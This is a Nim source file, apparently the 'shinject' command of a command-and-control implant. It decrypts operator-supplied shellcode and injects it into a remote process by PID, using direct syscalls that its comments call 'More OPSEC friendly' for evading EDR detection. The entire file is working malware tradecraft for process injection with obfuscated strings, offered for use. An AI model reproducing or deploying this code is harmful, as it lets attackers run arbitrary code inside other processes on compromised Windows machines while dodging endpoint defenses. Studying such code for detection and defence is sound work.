from strutils import parseInt
from zippy import uncompress
import ../../util/crypto
import winim/lean
import ../../core/webClientListener
from ../../util/strenc import obf

# Implementing nimvoke/syscalls instead of original dinvoke implementation
# the original dinvoke implementation used CreateFileA to read a fresh copy of ntdll.dll
# this maybe detected as suspicious by EDRs.
# Instead Nimvoke will parse the EAT of ntdll.dll from memory and get the syscall stubs from there
# avoiding the need to read ntdll.dll from disk. (More OPSEC friendly)
# Thanks to @nbaertsch for the nimvoke library: https://github.com/nbaertsch/nimvoke
import nimvoke/syscalls

# This implementation used the traditional method:
# 1. OpenProcess
# 2. AllocateVirtualMemory
# 3. WriteVirtualMemory
# 4. ProtectVirtualMemory
# 5. CreateThreadEx
# 6. CloseHandle

# You can always change the method to use the one you want,
# this is just to make it simple and easy to understand

# Nimvoke by default allows you to use any ntdll.dll syscall,
# Also allows you to import any function from another library with (Not tested but should work for example):
# refer to documentation for more info: https://github.com/nbaertsch

# dinvokeDefine(
#         ZwAllocateVirtualMemory,
#         "ntdll.dll",
#         proc (ProcessHandle: Handle, BaseAddress: PVOID, ZeroBits: ULONG_PTR, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
#     )

# var
#         hProcess: HANDLE = 0xFFFFFFFFFFFFFFFF
#         shellcodeSize: SIZE_T = 1000
#         baseAddr: PVOID
#         status: NTSTATUS

# status = ZwAllocateVirtualMemory(
#     hProcess,
#     &baseAddr,
#     0,
#     &shellcodeSize,
#     MEM_RESERVE or MEM_COMMIT,
#     PAGE_READWRITE)


proc shinject*(li : webClientListener.Listener, args : seq[string]) : string =
    # This should not happen due to preprocessing
    if not args.len >= 3:
        result = obf("Invalid number of arguments received. Usage: 'shinject [PID] [localfilepath]'.")
        return

    let
        processId: int = parseInt(args[0])
        shellcodeB64: string = args[1]
    var
        hProcess: HANDLE
        hThread: HANDLE
        oa: OBJECT_ATTRIBUTES
        ci: CLIENT_ID
        allocAddr: LPVOID
        bytesWritten: SIZE_T
        oldProtect: DWORD
        status: NTSTATUS

    result = obf("Injecting shellcode into remote process with PID ") & $processId & obf("...\n")

    # Configure CLIENT_ID for target process
    ci.UniqueProcess = processId

    # Use direct syscall from nimvoke
    status = syscall(NtOpenProcess,
        addr hProcess,
        PROCESS_ALL_ACCESS,
        addr oa,
        addr ci)

    if (status == 0):
        result.add(obf("[+] NtOpenProcess OK\n"))
    else:
        result.add(obf("[-] NtOpenProcess failed! Check if the target PID exists and that you have the appropriate permissions\n"))
        return

    # Decrypt and decompress shellcode
    var decrypted = decryptData(shellcodeB64, li.UNIQUE_XOR_KEY)
    var decompressed: string = uncompress(cast[string](decrypted))

    var shellcode: seq[byte] = newSeq[byte](decompressed.len)
    var shellcodeSize: SIZE_T = cast[SIZE_T](decompressed.len)
    copyMem(shellcode[0].addr, decompressed[0].addr, decompressed.len)

    # Allocate memory in remote process
    status = syscall(ZwAllocateVirtualMemory,
        hProcess,
        addr allocAddr,
        0,
        addr shellcodeSize,
        MEM_COMMIT,
        PAGE_READWRITE)

    if (status == 0):
        result.add(obf("[+] NtAllocateVirtualMemory OK\n"))
    else:
        result.add(obf("[-] NtAllocateVirtualMemory failed!\n"))
        return

    # Write shellcode to remote process
    status = syscall(NtWriteVirtualMemory,
        hProcess,
        allocAddr,
        unsafeAddr shellcode[0],
        shellcodeSize,
        addr bytesWritten)

    if (status == 0):
        result.add(obf("[+] NtWriteVirtualMemory OK\n"))
        result.add(obf("  \\_ Bytes written: ") & $bytesWritten & obf(" bytes\n"))
    else:
        result.add(obf("[-] NtWriteVirtualMemory failed!\n"))
        return

    # Change memory permissions to executable
    var protectAddr = allocAddr
    var shellcodeSize2: SIZE_T = cast[SIZE_T](shellcode.len)

    status = syscall(NtProtectVirtualMemory,
        hProcess,
        addr protectAddr,
        addr shellcodeSize2,
        PAGE_EXECUTE_READ,
        addr oldProtect)

    if (status == 0):
        result.add(obf("[+] NtProtectVirtualMemory OK\n"))
    else:
        result.add(obf("[-] NtProtectVirtualMemory failed!\n"))
        return

    # Create remote thread to execute shellcode
    status = syscall(NtCreateThreadEx,
        addr hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        allocAddr,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL)

    if (status == 0):
        result.add(obf("[+] NtCreateThreadEx OK\n"))
    else:
        result.add(obf("[-] NtCreateThreadEx failed!\n"))
        return

    # Cleanup
    CloseHandle(hThread)
    CloseHandle(hProcess)

    result.add(obf("[+] Injection successful!")) 